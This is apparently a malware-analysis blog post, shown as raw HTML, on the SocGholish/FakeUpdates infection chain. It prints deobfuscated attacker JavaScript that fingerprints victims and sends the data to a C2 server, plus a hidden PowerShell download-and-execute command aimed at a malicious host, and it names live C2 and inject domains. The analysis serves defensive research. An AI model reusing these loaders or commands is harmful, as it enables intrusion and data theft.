<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="This is a continuation of my personal series on SocGholish (or FakeUpdates). At the conclusion of &amp;ldquo;SocGholish Series - Part 2&amp;rdquo;, I had obtained the primary, first stage JavaScript payload, titled Updates.js.
In this writeup, I will execute the payload and observe the response(s) from the C2 server." />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/" />


    <title>
        
            SocGholish Series - Part 3 :: Reverse Engineering and Analysis  â€” Reverse Engineering and Analysis
        
    </title>




<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" integrity="sha512-Cv93isQdFwaKBV+Z4X8kaVBYWHST58Xb/jVOcV9aRsGSArZsgAnFIhMpDoMDcFNoUtday1hdjn0nGp3+KZyyFw==" crossorigin="anonymous" referrerpolicy="no-referrer" />



<link rel="stylesheet" href="/main.b4e976c829797907253e71bb59328781e1a8eb6a28c061f1150d96c9a9b63af4.css" integrity="sha256-tOl2yCl5eQclPnG7WTKHgeGo62oowGHxFQ2Wyam2OvQ=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">


<meta itemprop="name" content="SocGholish Series - Part 3">
<meta itemprop="description" content="This is a continuation of my personal series on SocGholish (or FakeUpdates). At the conclusion of &ldquo;SocGholish Series - Part 2&rdquo;, I had obtained the primary, first stage JavaScript payload, titled Updates.js.
In this writeup, I will execute the payload and observe the response(s) from the C2 server.">
<meta itemprop="datePublished" content="2023-06-19T07:20:21-05:00" />
<meta itemprop="dateModified" content="2023-06-19T07:20:21-05:00" />
<meta itemprop="wordCount" content="2506">



<meta itemprop="keywords" content="" />
<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="SocGholish Series - Part 3"/>
<meta name="twitter:description" content="This is a continuation of my personal series on SocGholish (or FakeUpdates). At the conclusion of &ldquo;SocGholish Series - Part 2&rdquo;, I had obtained the primary, first stage JavaScript payload, titled Updates.js.
In this writeup, I will execute the payload and observe the response(s) from the C2 server."/>







    <meta property="article:published_time" content="2023-06-19 07:20:21 -0500 CDT" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">></span>
            <span class="logo__text ">
                mithrandir</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/firstpost">About</a></li><li><a href="/posts">Malware Analysis</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
  <main class="post">

    <div class="post-info">
      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
          <circle cx="12" cy="12" r="10"></circle>
          <polyline points="12 6 12 12 16 14"></polyline>
        </svg>
        12 minutes

        
      </p>
    </div>

    <article>
      <h1 class="post-title">
        <a href="https://rerednawyerg.github.io/posts/malwareanalysis/socgholish_part3/">SocGholish Series - Part 3</a>
      </h1>

      

      
        <hr />
        <aside id="toc">
          <div class="toc-title">Table of Contents</div>
          <nav id="TableOfContents">
  <ul>
    <li><a href="#updatejs-payload">Update.js Payload</a>
      <ul>
        <li><a href="#obtaining-the-payload">Obtaining the Payload</a></li>
        <li><a href="#payload-contents">Payload Contents</a></li>
        <li><a href="#socgholish-c2-server-first-response">SocGholish C2 Server: First Response</a></li>
        <li><a href="#socgholish-c2-server-second-response">SocGholish C2 Server: Second Response</a></li>
      </ul>
    </li>
    <li><a href="#powershell---wudugftopf23svg">PowerShell - wudugf.top/f23.svg</a>
      <ul>
        <li><a href="#nested-powershell">Nested PowerShell</a></li>
        <li><a href="#nested-powershell-netsupport-rat">Nested PowerShell: NetSupport RAT</a></li>
        <li><a href="#nested-powershell-powershell-beacon">Nested PowerShell: PowerShell Beacon</a></li>
      </ul>
    </li>
    <li><a href="#powershell-beacon---asyncrat">PowerShell Beacon - AsyncRAT</a>
      <ul>
        <li><a href="#domain-generating-algorithm-dga">Domain Generating Algorithm (DGA)</a></li>
        <li><a href="#mutex">Mutex</a></li>
        <li><a href="#connect-to-c2">Connect to C2</a></li>
        <li><a href="#device-enumeration">Device Enumeration</a></li>
        <li><a href="#c2-server-response">C2 Server Response</a></li>
      </ul>
    </li>
    <li><a href="#emulation">Emulation</a></li>
    <li><a href="#final-thoughts">Final Thoughts</a></li>
    <li><a href="#execution-flow-chart">Execution Flow Chart</a></li>
    <li><a href="#iocs">IOCs</a></li>
  </ul>
</nav>
        </aside>
        <hr />

      

      <div class="post-content">
        <hr>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.css" integrity="sha256-sCl5PUOGMLfFYctzDW3MtRib0ctyUvI9Qsmq2wXOeBY=" crossorigin="anonymous" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/default-skin/default-skin.min.css" integrity="sha256-BFeI1V+Vh1Rk37wswuOYn5lsTcaU96hGaI7OUVCLjPc=" crossorigin="anonymous" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe.min.js" integrity="sha256-UplRCs9v4KXVJvVY+p+RSo5Q4ilAUXh7kpjyIP5odyc=" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.1/photoswipe-ui-default.min.js" integrity="sha256-PWHOlUzc96pMc8ThwRIXPn8yH4NOLu42RQ0b9SpnpFk=" crossorigin="anonymous"></script>


<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

<div class="pswp__bg"></div>

<div class="pswp__scroll-wrap">
    
    <div class="pswp__container">
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
      <div class="pswp__item"></div>
    </div>
    
    <div class="pswp__ui pswp__ui--hidden">
    <div class="pswp__top-bar">
      
      <div class="pswp__counter"></div>
      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
      <button class="pswp__button pswp__button--share" title="Share"></button>
      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
      
      
      <div class="pswp__preloader">
        <div class="pswp__preloader__icn">
          <div class="pswp__preloader__cut">
            <div class="pswp__preloader__donut"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
      <div class="pswp__share-tooltip"></div>
    </div>
    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
    </button>
    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
    </button>
    <div class="pswp__caption">
      <div class="pswp__caption__center"></div>
    </div>
    </div>
    </div>
</div>


<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="/js/pswp-init.js"></script>

<p>This is a continuation of my personal series on SocGholish (or FakeUpdates). At the conclusion of &ldquo;SocGholish Series - Part 2&rdquo;, I had obtained the primary, first stage JavaScript payload, titled <em>Updates.js</em>.</p>
<p>In this writeup, I will execute the payload and observe the response(s) from the C2 server.</p>
<h2 id="updatejs-payload">Update.js Payload</h2>
<p>To begin, let me quickly review how the payload was captured. I would recommend using the first post in the series to follow along, if desired.</p>
<p>An interesting new wrinkle which was not present a few months ago, as far as I was aware, is the use of multiple Keitaro TDS domains as injects on a single compromised site. Here is an interesting <a href="https://infosec.exchange/@rmceoin/110449126953524134">thread</a> describing their behavior.</p>
<p>However, for the sake of the logical flow of the series, I will not delve into this inject type in this post, and will focus on the previously identified injection type in the format:</p>
<pre><code class="language-String" data-lang="String">&lt;script async src=&quot;https://&lt;domain&gt;/&lt;random_string_path&gt;&quot;&gt;&lt;/script&gt;
</code></pre><h3 id="obtaining-the-payload">Obtaining the Payload</h3>
<p>In a Windows VM, I navigated to a site on which a SocGholish inject had been identified, hxxps://www.hekl-metall[.]de.</p>
<p>The inject:</p>
<pre><code class="language-String" data-lang="String">https://templates.jdlaytongrademaker[.]com/AVmNsHp77tlle7eCNmuhknIw6ZI7b7iJNm+5nCMrr4ojKfvHcTz+3nku6cB0LObYbSjnxSMk
</code></pre><p>The second stage server responds with a large, obfuscated block of JavaScript. The JavaScript checks for various identifying aspects of the victim device, and then makes a GET request to the same second stage server:</p>
<pre><code class="language-String" data-lang="String">https://templates.jdlaytongrademaker[.]com/krOlC+mRxmL2kZ85pYGJKeHHwHuwiYdq/NLJcujW+m3ikYkp4JGfKf/Eh3Y=
</code></pre><p>From here, the process is identical to what I outlined in the <a href="https://rerednawyerg.github.io/posts/malwareanalysis/socgholish/">Fake Update Page</a> section in the first post in the series, so I will not dig into it further here.</p>
<p>The fake update page is shown, and once the &ldquo;download&rdquo; button is clicked, the Update.js payload is added to my Downloads folder.</p>
<h3 id="payload-contents">Payload Contents</h3>
<p>The contents of the payload are very similar to what I described in &ldquo;SocGholish Series - Part 2&rdquo;.</p>
<p>After removing the obfuscation and performing logical function and variable renaming, I am left with:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">activeXObject</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;ActiveXObject&#39;</span>](<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
<span style="color:#a6e22e">activeXObject</span>[<span style="color:#e6db74">&#39;open&#39;</span>](<span style="color:#e6db74">&#39;POST&#39;</span>, <span style="color:#e6db74">&#39;https://ianxu.nodes.gammalambdalambda[.]org/gotoCheckout&#39;</span>), <span style="color:#f92672">!</span>[]),
<span style="color:#a6e22e">activeXObject</span>[<span style="color:#e6db74">&#39;setRequestHeader&#39;</span>](<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>), 
<span style="color:#a6e22e">activeXObject</span>[<span style="color:#e6db74">&#39;send&#39;</span>](<span style="color:#e6db74">&#39;9Wc+14W1/MmSf3OfPfWgAhWibAiEEJslsZ8BcxSL3w==&#39;</span>), 
<span style="color:#66d9ef">this</span>[<span style="color:#e6db74">&#39;eval&#39;</span>](<span style="color:#a6e22e">get_resp_text</span>(<span style="color:#a6e22e">activeXObject</span>))
</code></pre></div><p>The payload POSTs a hardcoded string to a C2 server, and executes the response, whatever it may be.</p>
<h3 id="socgholish-c2-server-first-response">SocGholish C2 Server: First Response</h3>
<p>Having configured tools to monitor the requests and responses to the C2 server, I executed the JS script as a normal user would, by double clicking it in the Downloads folder.</p>
<p>Immediately, the C2 responded with a short snippet of JavaScript, which is subsequently executed.</p>
<p>The cleaned response is below:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">sz</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">activex_obj</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;WScript.Shell&#39;</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wscript_network_obj</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;WScript.Network&#39;</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">array</span><span style="color:#f92672">=</span>[];
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;b&#39;</span>);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;501&#39;</span>);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">WScript</span>[<span style="color:#e6db74">&#39;ScriptFullName&#39;</span>]);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wscript_network_obj</span>[<span style="color:#e6db74">&#39;ComputerName&#39;</span>]);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wscript_network_obj</span>[<span style="color:#e6db74">&#39;UserName&#39;</span>]);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wscript_network_obj</span>[<span style="color:#e6db74">&#39;UserDomain&#39;</span>]);
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">activex_obj</span>[<span style="color:#e6db74">&#39;ExpandEnvironmentStrings&#39;</span>](<span style="color:#e6db74">&#39;%userdnsdomain%&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_ComputerSystem&#39;</span>,<span style="color:#e6db74">&#39;Manufacturer&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_ComputerSystem&#39;</span>,<span style="color:#e6db74">&#39;Model&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_BIOS&#39;</span>,<span style="color:#e6db74">&#39;Version&#39;</span>) <span style="color:#f92672">+</span> <span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_BIOS&#39;</span>,<span style="color:#e6db74">&#39;SerialNumber&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;SecurityCenter2&#39;</span>,<span style="color:#e6db74">&#39;AntiSpywareProduct&#39;</span>,<span style="color:#e6db74">&#39;displayName&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;SecurityCenter2&#39;</span>,<span style="color:#e6db74">&#39;AntiVirusProduct&#39;</span>,<span style="color:#e6db74">&#39;displayName&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;CIM_NetworkAdapter&#39;</span>,<span style="color:#e6db74">&#39;MACAddress&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_Process&#39;</span>,<span style="color:#e6db74">&#39;Name&#39;</span>));
<span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">wmi_query</span>(<span style="color:#e6db74">&#39;CIMV2&#39;</span>,<span style="color:#e6db74">&#39;Win32_OperatingSystem&#39;</span>,<span style="color:#e6db74">&#39;BuildNumber&#39;</span>));

<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">wmi_query</span>(<span style="color:#a6e22e">arg1</span>,<span style="color:#a6e22e">arg2</span>,<span style="color:#a6e22e">arg3</span>){
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">ret_str</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
	<span style="color:#66d9ef">try</span>{
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">winmgmt_obj</span><span style="color:#f92672">=</span><span style="color:#a6e22e">GetObject</span>(<span style="color:#e6db74">&#34;winmgmts:\\\\.\\root\\&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">arg1</span>);
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">results</span><span style="color:#f92672">=</span><span style="color:#a6e22e">winmgmt_obj</span>[<span style="color:#e6db74">&#39;ExecQuery&#39;</span>](<span style="color:#e6db74">&#39;SELECT * FROM &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">arg2</span>,<span style="color:#e6db74">&#39;WQL&#39;</span>);
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">enumerator</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Enumerator</span>(<span style="color:#a6e22e">results</span>);
		<span style="color:#66d9ef">for</span>(; <span style="color:#f92672">!</span><span style="color:#a6e22e">enumerator</span>[<span style="color:#e6db74">&#39;atEnd&#39;</span>](); <span style="color:#a6e22e">enumerator</span>[<span style="color:#e6db74">&#39;moveNext&#39;</span>]()){
			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">item</span><span style="color:#f92672">=</span><span style="color:#a6e22e">enumerator</span>[<span style="color:#e6db74">&#39;item&#39;</span>]();
			<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">item</span>[<span style="color:#a6e22e">arg3</span>]){
				<span style="color:#a6e22e">ret_str</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">item</span>[<span style="color:#a6e22e">arg3</span>] <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;|&#39;</span>;
			}
		}
	}
	<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){
		<span style="color:#a6e22e">ret_str</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;-1&#39;</span>;
	}
	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ret_str</span>;
}

<span style="color:#66d9ef">try</span>{
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">c2_string</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
	<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">array</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
		<span style="color:#a6e22e">c2_string</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">i</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">array</span>[<span style="color:#a6e22e">i</span>]) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&amp;&#39;</span>;
	}
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">resp_text</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlhttp_obj</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
	<span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#39;POST&#39;</span>,<span style="color:#e6db74">&#39;https://ianxu.nodes.gammalambdalambda.org/gotoCheckout&#39;</span>,<span style="color:#66d9ef">false</span>);
	<span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">setRequestHeader</span>(<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>,<span style="color:#e6db74">&#39;1&#39;</span>);
	<span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">send</span>(<span style="color:#a6e22e">c2_string</span>);
	<span style="color:#a6e22e">resp_text</span><span style="color:#f92672">=</span><span style="color:#a6e22e">xmlhttp_obj</span>.<span style="color:#a6e22e">responseText</span>;
	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">evString</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;eval&#39;</span>;
	<span style="color:#66d9ef">this</span>[<span style="color:#a6e22e">evString</span>](<span style="color:#a6e22e">resp_text</span>);
}
<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
</code></pre></div><p>The purpose of this script is to &ldquo;fingerprint&rdquo; the victim device and relay the information back to the C2 server in a specific format. If the C2 responds, the response text is executed.</p>
<p>The trouble I ran into here, is that since I was running Windows in a VM, this information would be captured in many of the WMI queries, including the manufacturer, model, and version, as well as some running processes.</p>
<p>The C2 <em>will</em> perform checks to estimate whether their &ldquo;victim&rdquo; is a security researcher, so I&rsquo;ll have to make some adjustments in order to get a response.</p>
<p>To quote from a fantastic <a href="https://www.proofpoint.com/us/blog/threat-insight/ta569-socgholish-and-beyond">article</a> from Proofpoint&rsquo;s Andrew Northern - &ldquo;SocGholish payloads are dynamically generated with data points about the victim being an input. This dynamic generation essentially locks each payload to each victim causing the payload to be rendered useless if it is moved to a different environment for analysis. Additionally, each payload is keyed to a specifically prefixed subdomain for command and control (C2) communication. Attempting to interact with a previously observed C2 domain with a known prefix will result in a closed connection.&rdquo;</p>
<p>If the C2 detects that the victim is a VM, it will not respond to any requests from that IP again. Each failure means I&rsquo;ll need to use a new victim IP address and run through the whole infection chain starting with the compromised site to get a freshly generated payload.</p>
<p>Inspired by this <a href="https://infosec.exchange/@rmceoin/110289792904238153">post</a> from <a href="https://infosec.exchange/@rmceoin">@rmceoin</a>, I created rules in BurpSuite to find and replace specific strings in the request body of traffic passing through the proxy.</p>
<p>For example, the string <code>VirtualBox</code> would be replaced with <code>HP%20Z620%20Workstation</code>, <code>VBoxTray.exe</code> would be replaced with <code>svchost.exe</code>, and so on.</p>
<p>In addition to these measures to obscure my VM from the threat actor, I also supplied a fake domain to replace the blank result returned by <code>activex_obj['ExpandEnvironmentStrings']('%userdnsdomain%')</code>. In a future post, I would like to explore the differences (if any) of the response returned by the C2 when given a domain versus no domain.</p>
<p>After a few sessions of trial and error, I was finally able to obtain another response from the C2.</p>
<h3 id="socgholish-c2-server-second-response">SocGholish C2 Server: Second Response</h3>
<p>The C2 responded with another block of JavaScript, but interestingly, this one was not obfuscated.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-JS" data-lang="JS"><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">initExeption</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;0&#39;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">runFileExeption</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">runFileResult</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">execFileName</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;7714b363.ps1&#39;</span>;
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">fs</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>);
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">_tempFilePathExec</span><span style="color:#f92672">=</span><span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">GetSpecialFolder</span>(<span style="color:#ae81ff">2</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;\\&#34;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">execFileName</span>;
<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">initExeption</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#39;0&#39;</span>){
	<span style="color:#66d9ef">try</span>{
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">wsh</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#34;WScript.Shell&#34;</span>);
		<span style="color:#a6e22e">runFileResult</span><span style="color:#f92672">=</span><span style="color:#a6e22e">wsh</span>.<span style="color:#a6e22e">Run</span>(<span style="color:#e6db74">&#39;powershell -w h -c &#34;iwr -usebasicparsing http://wudugf.top/f23.svg |iex&#34;&#39;</span>,<span style="color:#ae81ff">0</span>);;
	}
	<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){
		<span style="color:#a6e22e">runFileExeption</span> <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;error number:&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">number</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39; message:&#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">message</span>;
	}
}
<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span><span style="color:#f92672">=</span>[];
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;c&#39;</span>);
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#e6db74">&#39;501&#39;</span>);
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">_tempFilePathExec</span>);
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">runFileResult</span>);
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">initExeption</span>);
<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">runFileExeption</span>);
<span style="color:#a6e22e">request</span>(<span style="color:#a6e22e">req</span>);
<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">request</span>(<span style="color:#a6e22e">requestdata</span>,<span style="color:#a6e22e">retbinary</span>){
	<span style="color:#66d9ef">try</span>{
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">payload</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
		<span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">requestdata</span>.<span style="color:#a6e22e">length</span>; <span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
			<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">param</span>,<span style="color:#a6e22e">val</span>;
			<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">0</span>]){
				<span style="color:#a6e22e">param</span><span style="color:#f92672">=</span><span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">0</span>];
				<span style="color:#a6e22e">val</span><span style="color:#f92672">=</span><span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>][<span style="color:#ae81ff">1</span>];
			}
			<span style="color:#66d9ef">else</span>{
				<span style="color:#a6e22e">param</span><span style="color:#f92672">=</span><span style="color:#a6e22e">i</span>;
				<span style="color:#a6e22e">val</span><span style="color:#f92672">=</span><span style="color:#a6e22e">requestdata</span>[<span style="color:#a6e22e">i</span>];
			}
			<span style="color:#a6e22e">payload</span> <span style="color:#f92672">+=</span> <span style="color:#a6e22e">param</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent(<span style="color:#a6e22e">val</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;&amp;&#39;</span>;
		}
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">res</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">xmlhttp</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ActiveXObject</span>(<span style="color:#e6db74">&#39;MSXML2.XMLHTTP&#39;</span>);
